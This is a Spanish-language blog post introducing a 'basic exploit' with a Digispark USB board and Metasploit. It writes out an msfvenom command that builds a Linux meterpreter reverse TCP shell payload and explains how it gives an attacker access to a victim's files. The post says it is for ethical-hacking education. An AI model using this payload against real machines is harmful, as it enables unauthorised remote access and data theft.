---
layout: post
title: Basic Exploit with Digispark

---
# Introducción
En el dia de hoy explicaremos como hacer una técnica de explotación básica ayudandonos de Digispark y metasploit framework.
Este post lo he creado en Español para difundir mi idioma y dar a conocer el mundo de la seguridad informática en Español.
Para comenzar necesitaremos lo siguiente:  
  - Digispark: [amazon](https://www.amazon.es/AZDelivery-Digispark-Kickstarter-Desarrollo-compatible/dp/B076KS2QDS/ref=asc_df_B076KS2QDS/?tag=googshopes-21&linkCode=df0&hvadid=301006161094&hvpos=1o1&hvnetw=g&hvrand=3258160503763513062&hvpone=&hvptwo=&hvqmt=&hvdev=c&hvdvcmdl=&hvlocint=&hvlocphy=9047059&hvtargid=pla-602427609241&psc=1)
  - Disposición Linux, en mi caso uso ubuntu 18.04
  - Metasploit Framework
  
Cabe mencionar que necesitamos comprar el Digispark, yo lo compré en Amazon, 3 por casi 10 euros y sin duda merece la pena, se puede hacer
tales cantidades de proyectos..
Todo lo que explico es con fines educativos, no me hago responsable del mal uso que le hagais a este post, simplemente me gusta enseñar las habilidades de hacking etico que conozco con el fin de que aprendais como podeis ser atacados y saber defenderos.

# Construyendo el exploit
Para crear el exploit debemos usar la herramienta msfvenom y excribir la siguiente linea de código: 

`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP A USAR) LPORT=(PUERTO A USAR) -f elf > exploit`

Como podemos observar lo que crearemos es un exploit el cual, al ejecutarse en el equipo victima (con distribución linux) nos abrira una conexión tcp
la cual nos permitirá infectar el equipo y con meterpreter poder acceder a todos sus archivos. 
En la IP cada uno pondra su ip, se puede mirar abriendo la terminal y escribiendo el siguiente comando `ifconfig`, dependiendo si teneis vuestro computador enchufado por cable o lo teneis inalámbrico estará en una interfaz o otra. Esa IP es privada, es decir, solo os servirá para vuestra propia red, no obstante se puede crear este exploit y sacarlo fuera de la red local(LAN), pero eso lo dejare para otro post. Dicho esto yo usare mi IP privada y un puerto efímero, el 5000 por ejemplo.



